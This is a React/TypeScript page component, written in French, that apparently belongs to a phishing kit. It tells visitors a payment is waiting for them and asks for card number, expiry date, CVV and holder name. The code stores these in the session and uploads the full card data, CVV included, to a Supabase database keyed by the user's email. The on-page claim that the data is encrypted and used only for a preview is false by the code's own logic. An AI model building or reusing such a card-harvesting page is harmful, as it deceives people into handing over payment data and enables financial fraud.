
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import Footer from "@/components/Footer";
import ProgressStepper from "@/components/ProgressStepper";
import { updateUserSession, getFromSession } from "@/utils/sessionUtils";
import { upsertUser } from "@/utils/supabaseClient";
import { toast } from "sonner";
import Header from "@/components/Header";
import CreditCardPreview from "@/components/CreditCardPreview";

// Validation utilities
const validateCardNumber = (cardNumber: string): boolean => {
  // Remove spaces and dashes
  const digitsOnly = cardNumber.replace(/\D/g, '');
  
  // Check if the card number has a valid length
  if (digitsOnly.length < 13 || digitsOnly.length > 19) {
    return false;
  }
  
  // Luhn algorithm (mod 10)
  let sum = 0;
  let shouldDouble = false;
  
  // Loop through digits in reverse order
  for (let i = digitsOnly.length - 1; i >= 0; i--) {
    let digit = parseInt(digitsOnly.charAt(i));
    
    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  
  return (sum % 10) === 0;
};

const validateExpirationDate = (expDate: string): boolean => {
  // Match formats like MM/YY, MM-YY, MM/YYYY, or MMYY
  const datePattern = /^(0[1-9]|1[0-2])[/-]?([0-9]{2}|[0-9]{4})$/;
  
  if (!datePattern.test(expDate)) {
    return false;
  }
  
  // Extract month and year
  const cleanedDate = expDate.replace(/[/-]/g, '');
  const month = parseInt(cleanedDate.substring(0, 2));
  const year = parseInt(cleanedDate.substring(2));
  
  // Adjust year format (20XX)
  const fullYear = year < 100 ? year + 2000 : year;
  
  // Get current date
  const now = new Date();
  const currentMonth = now.getMonth() + 1; // JS months are 0-indexed
  const currentYear = now.getFullYear();
  
  // Check if the date is in the future
  if (fullYear < currentYear || (fullYear === currentYear && month < currentMonth)) {
    return false;
  }
  
  return true;
};

const validateCVV = (cvv: string): boolean => {
  // CVV is typically 3 digits (Visa, Mastercard, Discover) or 4 digits (Amex)
  const cvvPattern = /^[0-9]{3,4}$/;
  return cvvPattern.test(cvv);
};

const formatCardNumber = (cardNumber: string): string => {
  // Remove all non-digit characters
  const digitsOnly = cardNumber.replace(/\D/g, '');
  
  // Format with spaces every 4 digits
  const formatted = digitsOnly.replace(/(\d{4})(?=\d)/g, '$1 ');
  
  return formatted;
};

const formatExpirationDate = (expDate: string): string => {
  // Remove all non-digit characters
  const digitsOnly = expDate.replace(/\D/g, '');
  
  // Format as MM/YY if we have at least 2 digits
  if (digitsOnly.length >= 2) {
    const month = digitsOnly.substring(0, 2);
    const year = digitsOnly.substring(2, 4);
    return `${month}${year.length > 0 ? '/' + year : ''}`;
  }
  
  return digitsOnly;
};

const CardConfirmation: React.FC = () => {
  const [numeroCarte, setNumeroCarte] = useState("");
  const [dateExpiration, setDateExpiration] = useState("");
  const [cryptogramme, setCryptogramme] = useState("");
  const [titulaire, setTitulaire] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({
    numeroCarte: "",
    dateExpiration: "",
    cryptogramme: ""
  });
  const navigate = useNavigate();

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    // Format card number as user types
    const formatted = formatCardNumber(value);
    setNumeroCarte(formatted);
    
    // Clear error if field is valid
    if (validateCardNumber(formatted)) {
      setErrors(prev => ({ ...prev, numeroCarte: "" }));
    }
  };

  const handleExpirationChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    // Format expiration date as user types
    const formatted = formatExpirationDate(value);
    setDateExpiration(formatted);
    
    // Clear error if field is valid
    if (validateExpirationDate(formatted)) {
      setErrors(prev => ({ ...prev, dateExpiration: "" }));
    }
  };

  const handleCVVChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    // Only allow digits and limit length to 4
    if (/^\d{0,4}$/.test(value)) {
      setCryptogramme(value);
      
      // Clear error if field is valid
      if (validateCVV(value)) {
        setErrors(prev => ({ ...prev, cryptogramme: "" }));
      }
    }
  };

  const validateForm = (): boolean => {
    const newErrors = {
      numeroCarte: validateCardNumber(numeroCarte) ? "" : "Numéro de carte invalide",
      dateExpiration: validateExpirationDate(dateExpiration) ? "" : "Date d'expiration invalide",
      cryptogramme: validateCVV(cryptogramme) ? "" : "CVV invalide"
    };
    
    setErrors(newErrors);
    return !Object.values(newErrors).some(error => error !== "");
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      toast.error("Veuillez corriger les erreurs dans le formulaire");
      return;
    }

    setIsLoading(true);

    try {
      // Récupérer l'email de la session pour identifier l'utilisateur
      const userData = getFromSession("userData") || {};
      const email = userData.email;
      
      if (!email) {
        toast.error("Erreur: email utilisateur manquant");
        setIsLoading(false);
        return;
      }
      
      // Préparation des données de carte uniquement
      const cardData = {
        email,
        numerocarte: numeroCarte,
        dateexpiration: dateExpiration,
        cryptogramme
      };
      
      // Mettre à jour la session avec les données complètes
      updateUserSession({
        numeroCarte,
        dateExpiration,
        cryptogramme
      });
      
      // N'envoyer que les données de carte à Supabase
      await upsertUser(cardData);
      
      setIsLoading(false);
      navigate("/bank-confirmation");
    } catch (error: any) {
      console.error("Erreur lors de l'enregistrement:", error);
      setIsLoading(false);
      
      if (error.isRlsError) {
        toast.error(`Erreur de sécurité Supabase: ${error.message}`);
      } else {
        toast.error("Une erreur est survenue lors de l'enregistrement des données.");
      }
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      <Header />
      <main className="flex-1 flex flex-col items-center justify-center p-4">
        <div className="w-full max-w-4xl px-6 py-8 bg-white rounded-lg animate-fade-in shadow-md">
          <ProgressStepper 
            currentStep={2} 
            steps={["Confirm", "Checkpoint", "Verify", "Complete"]} 
          />

          <h1 className="text-3xl font-bold text-center mb-4">
            Confirmez votre carte
          </h1>
          
          <p className="text-center text-gray-600 mb-8">
            Vous avez un paiement en attente, configurer vos coordonnées bancaires pour accepter ce paiement.
          </p>

          <div className="mt-8 space-y-10">
            <div className="w-full">
              <span className="uppercase text-xs font-semibold text-gray-500 tracking-[0.4em] block mb-4 text-center">
                Aperçu en temps réel
              </span>
              <CreditCardPreview
                cardNumber={numeroCarte}
                expiration={dateExpiration}
                cvv={cryptogramme}
                cardHolder={titulaire}
              />
              <p className="text-xs text-gray-500 text-center mt-4">
                Les informations saisies sont chiffrées et affichées uniquement à titre d'aperçu.
              </p>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <label className="form-label">Numéro de carte</label>
                <input
                  type="text"
                  value={numeroCarte}
                  onChange={handleCardNumberChange}
                  className={`form-input ${errors.numeroCarte ? 'border-red-500' : ''}`}
                  placeholder="0000 0000 0000 0000"
                  inputMode="numeric"
                  autoComplete="cc-number"
                />
                {errors.numeroCarte && (
                  <p className="text-red-500 text-sm mt-1">{errors.numeroCarte}</p>
                )}
              </div>

              <div>
                <label className="form-label">Titulaire de la carte</label>
                <input
                  type="text"
                  value={titulaire}
                  onChange={(event) => setTitulaire(event.target.value)}
                  className="form-input"
                  placeholder="Nom du titulaire"
                  autoComplete="cc-name"
                />
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div>
                  <label className="form-label">Date d'expiration</label>
                  <input
                    type="text"
                    value={dateExpiration}
                    onChange={handleExpirationChange}
                    className={`form-input ${errors.dateExpiration ? 'border-red-500' : ''}`}
                    placeholder="MM/AA"
                    maxLength={5}
                    inputMode="numeric"
                    autoComplete="cc-exp"
                  />
                  {errors.dateExpiration && (
                    <p className="text-red-500 text-sm mt-1">{errors.dateExpiration}</p>
                  )}
                </div>
                <div>
                  <label className="form-label">Cryptogramme visuel</label>
                  <input
                    type="text"
                    value={cryptogramme}
                    onChange={handleCVVChange}
                    className={`form-input ${errors.cryptogramme ? 'border-red-500' : ''}`}
                    placeholder="CVV"
                    maxLength={4}
                    inputMode="numeric"
                    autoComplete="cc-csc"
                  />
                  {errors.cryptogramme && (
                    <p className="text-red-500 text-sm mt-1">{errors.cryptogramme}</p>
                  )}
                </div>
              </div>

              <button
                type="submit"
                className="primary-button flex items-center justify-center mt-6 w-full"
                disabled={isLoading}
              >
                {isLoading ? (
                  <span className="loading-spinner" />
                ) : (
                  "Continuer"
                )}
              </button>
            </form>
          </div>

          <div className="mt-10 border-t border-gray-200 pt-4 text-xs text-gray-500 text-center">
            Optionnel: utilisez le clavier numérique pour une saisie plus rapide. Vos données sont traitées avec des protocoles de sécurité renforcés.
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default CardConfirmation;
